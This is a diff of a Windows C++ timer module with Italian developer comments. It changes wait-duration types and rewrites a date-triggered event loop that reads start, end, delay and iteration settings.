@@ -144,12 +144,12 @@ DWORD WINAPI OnTimer(LPVOID lpParam) {
 		if (current >= ts && current <= te) { // We are in range
 			me->triggerStart();
 		} else {
-			DWORD dwWait;
+			LONGLONG dwWait;
 
 			if (current < ts) { // We are just before the start time
-				dwWait = _WaitForSingleObject(eventHandle, (DWORD)(ts - current));
+				dwWait = _WaitForSingleObject(eventHandle, (LONGLONG)(ts - current));
 			} else { // Start time is tomorrow
-				dwWait = _WaitForSingleObject(eventHandle, (DWORD)(ts + date.getMsDay() - current));
+				dwWait = _WaitForSingleObject(eventHandle, (LONGLONG)(ts + date.getMsDay() - current));
 			}
 
 
@@ -217,6 +217,7 @@ DWORD WINAPI OnTimer(LPVOID lpParam) {
 			}
 
 			if (curIterations >= iterations) {
+				//questo chiude subito l'evento e non ha spetta la fine del timer me->triggerEnd(); //BYGIO Aggiunto da ritestare tutto per gestire la "generazione" del LOF T3 alla fine della gestione dell'evento
 				me->requestStop();
 				continue;
 			}
@@ -323,6 +324,7 @@ DWORD WINAPI OnAfterInst(LPVOID lpParam) {
 	}
 }
 
+/***
 DWORD WINAPI OnDate(LPVOID lpParam) {
 	HANDLE evHandle;
 	Event *me = (Event *)lpParam;
@@ -393,10 +395,10 @@ DWORD WINAPI OnDate(LPVOID lpParam) {
 	}
 
 	me->triggerStart();
-/*
-	date.setDate(dateTo);
-	endDate = date.stringDateToMs();
-*/
+
+//	date.setDate(dateTo);
+//	endDate = date.stringDateToMs();
+
 	//se == INFINITE significa che non sono in repeat ma in start/stop
 	if (delay == INFINITE)
 		curDelay = (UINT)(endDate - now); 
@@ -405,6 +407,121 @@ DWORD WINAPI OnDate(LPVOID lpParam) {
 
 
 	LOOP {
+		_WaitForSingleObject(evHandle, curDelay);
+
+		if (me->shouldStop()) {
+			DBG_TRACE(L"Debug - Timer.cpp - Date Event is Closing\n", 1, FALSE);
+			me->setStatus(EVENT_STOPPED);
+
+			return 0;
+		}
+
+		if (curIterations >= iterations) {
+			me->requestStop();
+			continue;
+		}
+
+		if (date.getCurAbsoluteMs() > endDate) {
+			me->triggerEnd();
+			me->requestStop();
+			continue;
+		}
+
+		me->triggerRepeat();
+		curIterations++;
+	}
+}
+
+***/
+
+DWORD WINAPI OnDate(LPVOID lpParam) {
+	HANDLE evHandle;
+	Event *me = (Event *)lpParam;
+	Configuration *conf;
+	Date date;
+	int delay, iterations, curIterations = 0, curDelay = 0;
+	unsigned __int64 startDate, now, endDate;
+	wstring dateFrom, dateTo;
+
+	evHandle = me->getEvent();
+
+	me->setStatus(EVENT_RUNNING);
+	conf = me->getConf();
+
+	try {
+		dateFrom = conf->getString(L"datefrom");
+	} catch (...) {
+		dateFrom = L"1999-01-01 00:00:00";
+	}
+
+	try {
+		dateTo = conf->getString(L"dateto");
+	} catch (...) {
+		dateTo = L"2999-01-01 00:00:00";
+	}
+
+	try {
+		delay = conf->getInt(L"delay") * 1000;
+	} catch (...) {
+		delay = INFINITE;
+	}
+
+	try {
+		iterations = conf->getInt(L"iter");
+	} catch (...) {
+		iterations = MAXINT;
+	}
+
+	DBG_TRACE(L"Debug - Timer.cpp - OnDate Event is Alive\n", 1, FALSE);
+
+	date.setDate(dateFrom);
+	startDate = date.stringDateToMs();
+
+	now = date.getCurAbsoluteMs();
+
+	date.setDate(dateTo);
+	endDate = date.stringDateToMs();
+
+
+if (now >= startDate && now <= endDate) {
+	me->triggerStart();
+}
+else
+{
+
+	if (now < startDate) {
+		curDelay = (LONGLONG)(startDate - now);
+		_WaitForSingleObject(evHandle, curDelay);
+		
+		if (me->shouldStop()) {
+			DBG_TRACE(L"Debug - Timer.cpp - Date Event is Closing\n", 1, FALSE);
+			me->setStatus(EVENT_STOPPED);
+
+			return 0;
+		}
+		
+		me->triggerStart();
+	}
+
+}
+
+	
+	//curDelay = delay;
+
+	now = date.getCurAbsoluteMs();
+
+	
+	//se == INFINITE significa che non sono in repeat ma in start/stop
+	if (delay == INFINITE && endDate > now)
+		curDelay = (LONGLONG)(endDate - now); 
+	else
+		curDelay = delay; 
+
+	
+
+	LOOP {
+
+
 		_WaitForSingleObject(evHandle, curDelay);
 
 		if (me->shouldStop()) {
